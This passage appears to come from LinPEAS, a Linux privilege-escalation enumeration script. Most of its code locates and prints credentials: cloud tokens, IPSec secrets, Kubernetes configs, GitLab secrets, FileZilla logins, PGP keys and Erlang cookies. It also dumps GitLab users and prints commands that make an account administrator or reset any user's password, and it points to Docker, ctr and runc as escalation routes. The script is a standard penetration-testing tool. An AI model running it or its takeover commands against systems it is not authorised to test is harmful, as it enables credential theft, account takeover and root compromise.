    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"TokenCache\.dat$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "TokenCache.dat"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "TokenCache\.dat$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,TokenCache\.dat$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"AzureRMContext\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "AzureRMContext.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "AzureRMContext\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,AzureRMContext\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"ErrorRecords$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ErrorRecords"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "ErrorRecords$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ErrorRecords$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"TokenCache\.dat$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "TokenCache.dat"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "TokenCache\.dat$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,TokenCache\.dat$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"\.bluemix$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".bluemix"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "\.bluemix$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.bluemix$,${SED_RED},"; find "$f" -name "config.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"doctl$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "doctl"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "doctl$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,doctl$,${SED_RED},"; find "$f" -name "config.yaml" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.yaml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "access-token.*" | sed -${E} "s,access-token.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_CLOUD_INIT" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Cloud Init Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CLOUD_INIT\" | grep -E \"cloud\.cfg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "cloud.cfg"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_INIT" | grep -E "cloud\.cfg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,cloud\.cfg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "consumer_key|token_key|token_secret|metadata_url|password:|passwd:|PRIVATE KEY|PRIVATE KEY|encrypted_data_bag_secret|_proxy" | grep -Ev "\W+\#|^#" | sed -${E} "s,consumer_key|token_key|token_secret|metadata_url|password:|passwd:|PRIVATE KEY|PRIVATE KEY|encrypted_data_bag_secret|_proxy,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_CLOUDFLARE" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing CloudFlare Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CLOUDFLARE\" | grep -E \"\.cloudflared$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".cloudflared"; fi; fi; printf "%s" "$PSTORAGE_CLOUDFLARE" | grep -E "\.cloudflared$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.cloudflared$,${SED_RED},"; ls -lRA "$f";done; echo "";
fi


if [ "$PSTORAGE_ERLANG" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Erlang Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ERLANG\" | grep -E \"\.erlang\.cookie$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".erlang.cookie"; fi; fi; printf "%s" "$PSTORAGE_ERLANG" | grep -E "\.erlang\.cookie$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.erlang\.cookie$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_GMV_AUTH" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing GMV Auth Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_GMV_AUTH\" | grep -E \"gvm-tools\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "gvm-tools.conf"; fi; fi; printf "%s" "$PSTORAGE_GMV_AUTH" | grep -E "gvm-tools\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,gvm-tools\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|password.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_IPSEC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing IPSec Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_IPSEC\" | grep -E \"ipsec\.secrets$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ipsec.secrets"; fi; fi; printf "%s" "$PSTORAGE_IPSEC" | grep -E "ipsec\.secrets$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ipsec\.secrets$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*PSK.*|.*RSA.*|.*EAP =.*|.*XAUTH.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_IPSEC\" | grep -E \"ipsec\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ipsec.conf"; fi; fi; printf "%s" "$PSTORAGE_IPSEC" | grep -E "ipsec\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ipsec\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*PSK.*|.*RSA.*|.*EAP =.*|.*XAUTH.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_IRSSI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing IRSSI Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_IRSSI\" | grep -E \"\.irssi$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".irssi"; fi; fi; printf "%s" "$PSTORAGE_IRSSI" | grep -E "\.irssi$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.irssi$,${SED_RED},"; find "$f" -name "config" | while read ff; do ls -ld "$ff" | sed -${E} "s,config,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,password.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_KEYRING" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Keyring Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"keyrings$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "keyrings"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "keyrings$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,keyrings$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"\.keyring$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.keyring"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "\.keyring$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.keyring$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"\.keystore$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.keystore"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "\.keystore$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.keystore$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"\.jks$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.jks"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "\.jks$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.jks$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_FILEZILLA" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Filezilla Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_FILEZILLA\" | grep -E \"filezilla$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "filezilla"; fi; fi; printf "%s" "$PSTORAGE_FILEZILLA" | grep -E "filezilla$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,filezilla$,${SED_RED},"; find "$f" -name "sitemanager.xml" | while read ff; do ls -ld "$ff" | sed -${E} "s,sitemanager.xml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^;" | sed -${E} "s,Host.*|Port.*|Protocol.*|User.*|Pass.*,${SED_RED},g"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_FILEZILLA\" | grep -E \"filezilla\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "filezilla.xml"; fi; fi; printf "%s" "$PSTORAGE_FILEZILLA" | grep -E "filezilla\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,filezilla\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FILEZILLA\" | grep -E \"recentservers\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "recentservers.xml"; fi; fi; printf "%s" "$PSTORAGE_FILEZILLA" | grep -E "recentservers\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,recentservers\.xml$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_BACKUP_MANAGER" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Backup Manager Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_BACKUP_MANAGER\" | grep -E \"storage\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "storage.php"; fi; fi; printf "%s" "$PSTORAGE_BACKUP_MANAGER" | grep -E "storage\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,storage\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "'pass'|'password'|'user'|'database'|'host'" | sed -${E} "s,password|pass|user|database|host,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_BACKUP_MANAGER\" | grep -E \"database\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "database.php"; fi; fi; printf "%s" "$PSTORAGE_BACKUP_MANAGER" | grep -E "database\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,database\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "'pass'|'password'|'user'|'database'|'host'" | sed -${E} "s,password|pass|user|database|host,${SED_RED},g"; done; echo "";
fi


##-- SI) passwd files (splunk)
SPLUNK_BIN="$(command -v splunk 2>/dev/null)"
if [ "$PSTORAGE_SPLUNK" ] || [ "$SPLUNK_BIN" ] || [ "$DEBUG" ]; then
  print_2title "Searching uncommon passwd files (splunk)"
  if [ "$SPLUNK_BIN" ]; then echo "splunk binary was found installed on $SPLUNK_BIN" | sed "s,.*,${SED_RED},"; fi
  printf "%s\n" "$PSTORAGE_SPLUNK" | grep -v ".htpasswd" | sort | uniq | while read f; do
    if [ -f "$f" ] && ! [ -x "$f" ]; then
      echo "passwd file: $f" | sed "s,$f,${SED_RED},"
      cat "$f" 2>/dev/null | grep "'pass'|'password'|'user'|'database'|'host'|\$" | sed -${E} "s,password|pass|user|database|host|\$,${SED_RED},"
    fi
  done
  echo ""
fi

if [ "$PSTORAGE_KCPASSWORD" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing kcpassword files"
  print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#kcpassword"
  printf "%s\n" "$PSTORAGE_KCPASSWORD" | while read f; do
    echo "$f" | sed -${E} "s,.*,${SED_RED},"
    base64 "$f" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  done
  echo ""
fi

##-- SI) Gitlab
if [ "$(command -v gitlab-rails)" ] || [ "$(command -v gitlab-backup)" ] || [ "$PSTORAGE_GITLAB" ] || [ "$DEBUG" ]; then
  print_2title "Searching GitLab related files"
  # Check gitlab-rails
  if [ "$(command -v gitlab-rails)" ]; then
    echo "gitlab-rails was found. Trying to dump users..."
    gitlab-rails runner 'User.where.not(username: "peasssssssss").each { |u| pp u.attributes }' | sed -${E} "s,email|password,${SED_RED},"
    echo "If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner 'user = User.find_by(email: \"youruser@example.com\"); user.admin = TRUE; user.save!'"
    echo "Alternatively, you could change the password of any user by running: gitlab-rails runner 'user = User.find_by(email: \"admin@example.com\"); user.password = \"pass_peass_pass\"; user.password_confirmation = \"pass_peass_pass\"; user.save!'"
    echo ""
  fi
  if [ "$(command -v gitlab-backup)" ]; then
    echo "If you have enough privileges, you can create a backup of all the repositories inside gitlab using 'gitlab-backup create'"
    echo "Then you can get the plain-text with something like 'git clone \@hashed/19/23/14348274[...]38749234.bundle'"
    echo ""
  fi
  # Check gitlab files
  printf "%s\n" "$PSTORAGE_GITLAB" | sort | uniq | while read f; do
    if echo $f | grep -q secrets.yml; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      cat "$f" 2>/dev/null | grep -Iv "^$" | grep -v "^#"
    elif echo $f | grep -q gitlab.yml; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      cat "$f" | grep -A 4 "repositories:"
    elif echo $f | grep -q gitlab.rb; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      cat "$f" | grep -Iv "^$" | grep -v "^#" | sed -${E} "s,email|user|password,${SED_RED},"
    fi
    echo ""
  done
  echo ""
fi

if [ "$PSTORAGE_GITHUB" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Github Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.github$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".github"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.github$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.github$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.gitconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".gitconfig"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.gitconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.gitconfig$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.git-credentials$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".git-credentials"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.git-credentials$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.git-credentials$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.git$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".git"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.git$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.git$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_SVN" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Svn Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SVN\" | grep -E \"\.svn$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".svn"; fi; fi; printf "%s" "$PSTORAGE_SVN" | grep -E "\.svn$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.svn$,${SED_RED},"; ls -lRA "$f";done; echo "";
fi


if [ "$PSTORAGE_PGP_GPG" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing PGP-GPG Files (limit 70)"
    ( (command -v gpg && gpg --list-keys) || echo_not_found "gpg") 2>/dev/null
    ( (command -v netpgpkeys && netpgpkeys --list-keys) || echo_not_found "netpgpkeys") 2>/dev/null
    (command -v netpgp || echo_not_found "netpgp") 2>/dev/null
    if ! [ "`echo \"$PSTORAGE_PGP_GPG\" | grep -E \"\.pgp$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.pgp"; fi; fi; printf "%s" "$PSTORAGE_PGP_GPG" | grep -E "\.pgp$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.pgp$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_PGP_GPG\" | grep -E \"\.gpg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.gpg"; fi; fi; printf "%s" "$PSTORAGE_PGP_GPG" | grep -E "\.gpg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.gpg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_PGP_GPG\" | grep -E \"\.gnupg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.gnupg"; fi; fi; printf "%s" "$PSTORAGE_PGP_GPG" | grep -E "\.gnupg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.gnupg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_CACHE_VI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Cache Vi Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CACHE_VI\" | grep -E \"\.swp$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.swp"; fi; fi; printf "%s" "$PSTORAGE_CACHE_VI" | grep -E "\.swp$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.swp$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CACHE_VI\" | grep -E \"\.viminfo$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.viminfo"; fi; fi; printf "%s" "$PSTORAGE_CACHE_VI" | grep -E "\.viminfo$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.viminfo$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_WGET" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Wget Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_WGET\" | grep -E \"\.wgetrc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".wgetrc"; fi; fi; printf "%s" "$PSTORAGE_WGET" | grep -E "\.wgetrc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.wgetrc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[uU][sS][eE][rR].*,${SED_RED},g"; done; echo "";
fi


##-- SI) containerd installed
if ! [ "$SEARCH_IN_FOLDER" ]; then
  containerd=$(command -v ctr)
  if [ "$containerd" ] || [ "$DEBUG" ]; then
    print_2title "Checking if containerd(ctr) is available"
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation"
    if [ "$containerd" ]; then
      echo "ctr was found in $containerd, you may be able to escalate privileges with it" | sed -${E} "s,.*,${SED_RED},"
      ctr image list 2>&1
    fi
    echo ""
  fi
fi

##-- SI) runc installed
if ! [ "$SEARCH_IN_FOLDER" ]; then
  runc=$(command -v runc)
  if [ "$runc" ] || [ "$DEBUG" ]; then
    print_2title "Checking if runc is available"
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation"
    if [ "$runc" ]; then
      echo "runc was found in $runc, you may be able to escalate privileges with it" | sed -${E} "s,.*,${SED_RED},"
    fi
    echo ""
  fi
fi

#-- SI) Docker
if [ "$PSTORAGE_DOCKER" ] || [ "$DEBUG" ]; then
  print_2title "Searching docker files (limit 70)"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation"
  printf "%s\n" "$PSTORAGE_DOCKER" | head -n 70 | while read f; do
    ls -l "$f" 2>/dev/null
    if ! [ "$IAMROOT" ] && [ -S "$f" ] && [ -w "$f" ]; then
      echo "Docker related socket ($f) is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
    fi
  done
  echo ""
fi

if [ "$PSTORAGE_KUBERNETES" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Kubernetes Files (limit 70)"
    (env || set) | grep -Ei "kubernetes|kube" | grep -v "PSTORAGE_KUBERNETES|USEFUL_SOFTWARE" | sed -${E} "s,kubernetes|kube,${SED_RED},"
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubeconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubeconfig"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubeconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubeconfig$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"bootstrap-kubeconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "bootstrap-kubeconfig"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "bootstrap-kubeconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,bootstrap-kubeconfig$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubelet-kubeconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubelet-kubeconfig"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubelet-kubeconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubelet-kubeconfig$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubelet\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubelet.conf"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubelet\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubelet\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"psk\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "psk.txt"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "psk\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,psk\.txt$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"\.kube.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".kube*"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "\.kube.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.kube.*$,${SED_RED},"; find "$f" -name "config" | while read ff; do ls -ld "$ff" | sed -${E} "s,config,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubelet$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubelet"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubelet$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubelet$,${SED_RED},"; find "$f" -name "config.yaml" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.yaml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";find "$f" -name "kubeadm-flags.env" | while read ff; do ls -ld "$ff" | sed -${E} "s,kubeadm-flags.env,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kube-proxy$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kube-proxy"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kube-proxy$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kube-proxy$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubernetes$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubernetes"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubernetes$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubernetes$,${SED_RED},"; find "$f" -name "admin.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,admin.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";find "$f" -name "controller-manager.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,controller-manager.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";find "$f" -name "scheduler.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,scheduler.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_FIREFOX" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Firefox Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_FIREFOX\" | grep -E \"\.mozilla$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".mozilla"; fi; fi; printf "%s" "$PSTORAGE_FIREFOX" | grep -E "\.mozilla$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.mozilla$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FIREFOX\" | grep -E \"Firefox$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Firefox"; fi; fi; printf "%s" "$PSTORAGE_FIREFOX" | grep -E "Firefox$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Firefox$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_CHROME" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Chrome Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CHROME\" | grep -E \"google-chrome$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "google-chrome"; fi; fi; printf "%s" "$PSTORAGE_CHROME" | grep -E "google-chrome$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,google-chrome$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CHROME\" | grep -E \"Chrome$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Chrome"; fi; fi; printf "%s" "$PSTORAGE_CHROME" | grep -E "Chrome$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Chrome$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_AUTOLOGIN" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Autologin Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_AUTOLOGIN\" | grep -E \"autologin$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "autologin"; fi; fi; printf "%s" "$PSTORAGE_AUTOLOGIN" | grep -E "autologin$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,autologin$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,passwd,${SED_RED},g"; done; echo "";
